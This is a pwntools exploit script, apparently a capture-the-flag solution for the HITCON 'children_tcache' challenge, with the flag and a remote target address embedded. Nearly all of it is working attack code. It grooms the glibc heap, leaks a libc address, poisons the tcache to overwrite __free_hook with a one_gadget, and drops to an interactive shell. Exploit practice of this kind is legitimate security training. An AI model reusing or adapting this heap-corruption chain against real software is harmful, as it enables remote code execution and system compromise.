#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

# hitcon{l4st_rem41nd3r_1s_v3ry_us3ful}

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './children_tcache'
TARGET = ('54.178.132.125', 8763)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def malloc(size, data):
    r.sendlineafter('Your choice:', '1')
    r.sendlineafter('Size:', str(size))
    r.sendafter('Data:', str(data))

def show(idx):
    r.sendlineafter('Your choice:', '2')
    r.sendlineafter('Index:', str(idx))
    
def free(idx):
    r.sendlineafter('Your choice:', '3')
    r.sendlineafter('Index:', str(idx))
    
code = ELF(BINARY)
libc = ELF(LIBC64)

#attach(0xe4b)

malloc(0x810, 'x') # 0
malloc(0x410, 'xdd') # 1
malloc(0x100, 'barrier') # 2

# shrink heap
free(0)
malloc(0x108, 'a'*0x108) # 0
malloc(0x100, 'b1') # 3 # unlink
malloc(0x100, 'b2') # 4

# free 3
for i in xrange(5):
    malloc(0x100, 'c') # 5,6,7,8,9

for i in xrange(6):
    free(9-i)

free(2)
free(3)
free(1) # free xdd

# leak
malloc(0x100, 'x') # 1
malloc(0x100, 'x') # 2 
malloc(0x90, 'y') # 3
malloc(0x90, 'y') # 4
malloc(0x60, 'y') # 5
show(2)
libc.address = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x3ebca0
log.info(hex(libc.address))

# edit
malloc(0x200, 'a'*0x110 + p64(libc.sym['__free_hook'])) # 6
malloc(0x100, 'x') # 7 
malloc(0x100, p64(libc.address + 0x4f322)) # 8

free(7)
r.interactive()
    
